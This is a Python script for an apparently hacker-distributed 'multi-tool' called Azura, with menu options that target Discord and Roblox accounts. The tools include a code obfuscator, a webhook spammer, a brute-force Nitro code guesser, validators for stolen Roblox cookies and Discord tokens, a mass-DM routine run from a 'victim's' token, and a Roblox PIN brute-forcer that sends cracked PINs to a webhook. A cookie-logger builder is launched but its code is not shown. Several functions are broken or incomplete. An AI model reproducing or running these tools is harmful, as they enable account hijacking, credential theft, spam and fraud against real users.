import time
import colorama
from colorama import Fore 
import marshal
import zlib
import requests
from pystyle import *
import os
from pystyle import Colors, Colorate
import threading
import random
import requests
import sys
import shutil
import random
import string
from discord.ext import commands
from discord.ext.commands import Bot
import webbrowser
import subprocess
import httpx
import re
def main(s):
	for c in s + '\n':
		sys.stdout.write(c)
		sys.stdout.flush()
		time.sleep(1./10)
main(Fore.RED + "     Welcome to Azura!")
main(Fore.RED + "We are happy to have you back")
time.sleep(1)
print(chr(27)+'[2j')
print('\033c')
print('\x1bc')
pass
banner = """
       Devved By: synthetic#7187
 █████╗ ███████╗██╗   ██╗██████╗  █████╗ 
██╔══██╗╚══███╔╝██║   ██║██╔══██╗██╔══██╗ 
███████║  ███╔╝ ██║   ██║██████╔╝███████║
██╔══██║ ███╔╝  ██║   ██║██╔══██╗██╔══██║
██║  ██║███████╗╚██████╔╝██║  ██║██║  ██║
╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
"""
print(Colorate.Horizontal(Colors.green_to_blue, Center.XCenter(banner)))
print("")
banner1 = """
  [1] Python Obfuscator  [2] Webhook Spammer
  [3] Webhook Deleter    [4] Webhook Check
  [5] Proxy Scraper      [6] Proxy Checker
  [7] NitroGen and check [8] Roblox Cookie Checker
  [9] Token Info         [10] Token MassDM
  [11] Pin Cracker       [12] Cookie Logger Builder
"""
print(Colorate.Horizontal(Colors.green_to_blue, Center.XCenter(banner1)))
print("")
choice = int(input(f"                                  {Colors.green} [+] > "))

if choice == 1:
       os.system("title Simple-OBF: simplest marshal python obfuscator out there")
       print("""
       ╔═╗╦┌┬┐┌─┐┬  ┌─┐  ╔═╗┌┐ ┌─┐
       ╚═╗║│││├─┘│  ├┤───║ ║├┴┐├┤  Simplest marshal obf out there
       ╚═╝╩┴ ┴┴  ┴─┘└─┘  ╚═╝└─┘└ 
       https://github.com/syntheticc
       """)
       pythonfile = input("python file name that you want to obf > ")
       with open(f'{pythonfile}.py') as fi:
              pro = fi.read()
              mar = marshal.dumps(pro)
              zlb = zlib.compress(mar)
              with open(f"{pythonfile}.py", 'w') as f:
                     f.write(f"import marshal,zlib;exec(marshal.loads(zlib.decompress({zlb})))")

       print("finished")
       time.sleep(2)
       exe = input("Compile to exe press enter to continue > ")
       os.system(f'pyinstaller --onefile {pythonfile}.py')

elif choice == 2:
    webhook = input("[+] Enter your webhook > ")
    message = input("[+] Enter The Message > ")
    try:
        while True:
            try:
                time.sleep(0.3)
                data = requests.post(webhook, json={"content" : message})
                if data.status_code == 204:
                    print("[+] Sent [" + message +"]")
            except:
                print("Error")
                time.sleep(5)
                main()
    except KeyboardInterrupt:
        print("Succesfully Spammed The Webhook")
        time.sleep(2)
        main(s)

elif choice == 3:
    webhook = input("[+] Enter Webhook > ")
    deletehook = requests.delete(webhook)
    the = requests.get(webhook)
    if the.status_code == 404:
      print(Fore.GREEN + "[+] Webhook Deleted")
    main(s)

elif choice == 4:
   webhook= input("[+] Enter Webhook > ")
   r = requests.get(webhook)
   if r.status_code == 200:
    print(Fore.GREEN + "Webhook Is Working")
    time.sleep(2)
    main(s)
   else:
        input(Fore.RED + 'Webhook Is Not Working.')
        time.sleep(2)
        main(s)
elif choice == 5:
    os.system('cls' if os.name == 'nt' else 'clear')
    http = ['https://api.proxyscrape.com/?request=displayproxies&proxytype=http&ssl=yes','https://api.proxyscrape.com/?request=displayproxies&proxytype=https&ssl=yes','https://sheesh.rip/new.txt','https://www.proxy-list.download/api/v1/get?type=https','https://www.proxy-list.download/api/v1/get?type=http','https://spys.me/proxy.txt','https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/http.txt','https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt','https://raw.githubusercontent.com/RX4096/proxy-list/main/online/all.txt','https://raw.githubusercontent.com/almroot/proxylist/master/list.txt']
    s4 = ['https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&ssl=yes','https://www.proxy-list.download/api/v1/get?type=socks4','https://spys.me/socks.txt','https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/socks4.txt','https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt']
    s5 = ['https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&ssl=yes','https://www.proxy-list.download/api/v1/get?type=socks5','https://spys.me/socks.txt','https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/socks5.txt','https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt']
    try:
        os.remove('http.txt')
        os.remove('socks4.txt')
        os.remove('socks5.txt')
    except:
        pass
    for src in http:
        r = httpx.get(src)
        with open("http.txt", "a") as file:
            for proxy in re.findall(re.compile('([0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}):([0-9]{1,5})'), r.text):
                proxies = proxy[0] + ':' + proxy[1] + '\n'
                file.write(proxies)
    print('HTTP Scraped')
    for src in s4:
        r = httpx.get(src)
        with open("socks4.txt", "a") as file:
            for proxy in re.findall(re.compile('([0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}):([0-9]{1,5})'), r.text):
                proxies = proxy[0] + ':' + proxy[1] + '\n'
                file.write(proxies)
    print('SOCKS4 Scraped')
    for src in s5:
        r = httpx.get(src)
        with open("socks5.txt", "a") as file:
            for proxy in re.findall(re.compile('([0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}):([0-9]{1,5})'), r.text):
                proxies = proxy[0] + ':' + proxy[1] + '\n'
                file.write(proxies)
    print('SOCKS5 Scraped')
    time.sleep(2)
    main()


if choice == 6:
    os.system('cls' if os.name == 'nt' else 'clear')
    def check(PROXY,url,prxtype):
        if prxtype == 'HTTP':
            HxClient = httpx.Client(http2=True,headers = {'user-agent':'Mozilla/5.0 ProxyCheck[CrownHTTP]','accept-language': 'en'},follow_redirects=True,proxies='http://'+PROXY)
        elif prxtype == 'SOCKS5':
            HxClient = httpx.Client(http2=True,headers = {'user-agent':'Mozilla/5.0 ProxyCheck[CrownSOCKS5]','accept-language': 'en'},follow_redirects=True,proxies='socks5://'+PROXY)
        elif prxtype == 'SOCKS4':
        	HxClient = httpx.Client(http2=True,headers = {'user-agent':'Mozilla/5.0 ProxyCheck[CrownSOCKS4]','accept-language': 'en'},follow_redirects=True,transport=SyncProxyTransport.from_url('socks4://'+PROXY))

        with HxClient as client:
            try:
                    req = client.get(url)
                    if req.status_code == 200 and "GET" in req.text:
                        print (Fore.GREEN + '[Valid] ' + PROXY + ' ' + str(req.status_code))
                        with open(f'{prxtype}_good.txt', 'a') as xX:
                            xX.write(PROXY + '\n')
                    elif req.status_code != 200 or not "GET" in req.text:
                        print (Fore.YELLOW + '[Blocked] ' + PROXY + ' ' + str(req.status_code))
                    else:
                        print(Fore.RED + '[Bad] ' + PROXY + ' ' + str(req.status_code))
            except httpx.HTTPError as exc:
                pass
            except:
                pass
    def proxer():
        try:
            prxtype = input('HTTP/SOCKS4/SOCKS5: ')
        except:
            print('Invalid')
            main()
        try:
            fileproxy = input('Proxy File: ')
        except:
            print('Invalid')
            main()
        domain = 'https://httpbin.org/anything'
        os.system('cls' if os.name == 'nt' else 'clear')
        with open(fileproxy, 'r') as x:
            prox = x.read().splitlines()
        Threads = []
        for proxy in prox:
            t = Thread(target=check, args=(proxy,domain,prxtype),daemon=True)
            t.start()
            Threads.append(t)
        for i in Threads:
            i.join()
        print('Done!')
        time.sleep(5)
    proxer()
    main(s)

if choice == 7: 
    amt = input("[+] Amount? > ")
    os.system('cls')         #clears console
    for i in range(int(amt)):      #repeats the generator & checker for the selected amount
        code = ('').join(random.choices(string.ascii_letters + string.digits, k=16))
        r = requests.get(f"https://discordapp.com/api/v6/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true")
        if r.status_code == 200:
            print(Fore.GREEN + f"  [+]Valid Nitro Code > discord.gift/{code} - {i}")
                      #the webhook sending version is in the non-sourcecode version <3
        else:
            print(Fore.RED + f"  [!] Invalid > discord.gift/{code}  -  {i}")  
    ext11 = input("\nPress ENTER to exit > ") #exit
    if ext11 == "":
        main(s)
    else:
        print(Fore.WHITE + "")
        repeat()

if choice == 8:
    cookie = input("Enter Roblox Cookie: ")
    try:
        r = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": cookie}).json()
        print("Cookie Is Valid")
        try:
            print("Acount User Id: " +  str(r["UserID"]))
        except Exception:
            print("Acount User Id: ERROR")
        try:
            print("Acount Username: " +  str(r["UserName"]))
        except Exception:
            print("Acount Username: ERROR")
        try:    
            print("Robux Balance: " +  str(r["RobuxBalance"]))
        except Exception:
            print("Robux Balance: ERROR")
        try:    
            print("Account Picture: " +  str(r["ThumbnailUrl"]))
        except Exception:
            print("Account Picture: ERROR")
        try:    
            print("Builders Club Member: " +  str(r["IsAnyBuildersClubMember"]))
        except Exception:
            print("Builders Club Member: ERROR")
        try:    
            print("Premium: " +  str(r["IsPremium"]))
        except Exception:
            print("Premium: ERROR")
        while True:
            save = input("Wanna Save Info In A Txt File (y/n): ")
            if save == "y" or save == "n":
                break
            else:
                print("Enter A Valid Choice")
        if save == "y":
            file = open(str(r["UserName"])+".txt", "a")
            try:
                file.write("Acount User Id: " +  str(r["UserID"]) + "\n")
            except Exception:
                file.write("Acount User Id: ERROR" + "\n")
            try:
                file.write("Acount Username: " +  str(r["UserName"]) + "\n")
            except Exception:
                file.write("Acount Username: ERROR" + "\n")
            try:    
                file.write("Robux Balance: " +  str(r["RobuxBalance"]) + "\n")
            except Exception:
                file.write("Robux Balance: ERROR" + "\n")
            try:    
                file.write("Account Picture: " +  str(r["ThumbnailUrl"]) + "\n")
            except Exception:
                file.write("Account Picture: ERROR" + "\n")
            try:    
                file.write("Builders Club Member: " +  str(r["IsAnyBuildersClubMember"]) + "\n")
            except Exception:
                file.write("Builders Club Member: ERROR" + "\n")
            try:    
                file.write("Premium: " +  str(r["IsPremium"]) + "\n")
            except Exception:
                file.write("Premium: ERROR" + "\n")
            file.close()
            print("Succsesfully Saved")
            input("")
    except Exception:
        print("Cookie Invalid")
        input("")

if choice == 9:
    os.system('cls; clear')
    print('TOKEN INFO: \n')
    token = input('Token: ')
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    if r.status_code == 200:
      print('\n - Token is valid - ')
      userName = r.json()['username'] + '#' + r.json()['discriminator']
      userID = r.json()['id']
      phone = r.json()['phone']
      email = r.json()['email']
      mfa = r.json()['mfa_enabled']
      verified = r.json()['verified']
      print(f'''
User: {userName}
ID: {userID}
Phone: {phone}
Email: {email}
MFA: {mfa}
Verified: {verified}
Token: {token}
            ''')
      print('\nPress [Enter] key to go back to Main Menu.')
      while True:
          main(s)
          os.system('cls; clear')
    else:
      print('\nInvalid token')
      print('\nPress [Enter] key to go back to Main Menu.')
      main(s)
      os.system('cls; clear')

if choice == 10:
  token = input('Victims token to mass dm >')

  async def massdm(token):
    for friend in client.user.friends:
        try:
            embed = discord.Embed(title='`nuked by AZURA MULTI`', color=0xf3c300, description= f'''{content} \n `>:D`''')
            embed.set_footer(text="AZURA ON TOP ;;🎸")
            await friend.send(embed=embed)
            print('{0} Massed'.format(friend.name))
        except:
            pass
    print('Finished')
    main(s)

if choice == 11:
  def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

  def getToken():
    r = httpx.post('https://auth.roblox.com/v1/login', cookies={".ROBLOSECURITY":cookie})
    return {'X-CSRF-TOKEN': r.headers['x-csrf-token']}

  def menu():
    global ping
    global cookie
    global webhook
    global token
    print('\nEnter your cookie below:')
    cookie = input()
    clear()
    print('\nEnter your webhook below:')
    webhook = input()
    clear()
    print('\nShould we ping Everyone?: (y/n)')
    pingInput = input()
    clear()
    if pingInput == 'y':
        ping = '@everyone'

    elif pingInput == 'n':
        ping = '***Pin Cracked!***'

    else:
        print(f'Invalid Input {pingInput} please input y or n')

    token = getToken()

  def correctPin(ping):
    username = httpx.get("https://users.roblox.com/v1/users/authenticated", cookies={".ROBLOSECURITY":cookie}).json()['name']
    data = {
        "content" : ping,
        "username" : "AZURA Pin Cracker",
        "avatar_url" : "https://cdn.discordapp.com/attachments/857646271433801748/861595357778804756/lucidicon.png"
    }
    data["embeds"] = [{
        "description" : f"{username}\'s Pin:\n```{pin}```",
        "title" : "Cracked Pin!",
        "color" : 0x00ffff,
    }]
    result = httpx.post(webhook, json=data)

  def checkPin(pin):
    try:
        r = httpx.post("https://auth.roblox.com/v1/account/pin/unlock", json={'pin': pin}, headers=token, cookies={".ROBLOSECURITY":cookie})
        if 'unlockeduntil' in r.text.lower():
            print(f'Pin Cracked! Pin: {pin}')
            correctPin(ping)
            return "cracked"
    
        elif 'too many requests made' in r.text.lower():  
            print('  Ratelimited, trying again in 60 seconds..')
            time.sleep(60)
            return "ratelimit"
                    
        elif 'authorization' in r.text.lower():
            print('  Error! Is the cookie valid?')
            return "cookie"
            
        elif 'incorrect' in r.text.lower():
            print(f"  Tried: {pin} , Incorrect!")
            time.sleep(10) 
            return "incorrect"

    except Exception as e: 
        print(f'error: {e}')

  def pinCrackerMain():
    for i in range(9999):
        pin = str(i).zfill(4)
        pinResponse = checkPin(pin)
        if pinResponse == "cookie":
            break
        elif pinResponse == "cracked":
            break



if choice == 12:
  os.system('python cookiebuilder.py')

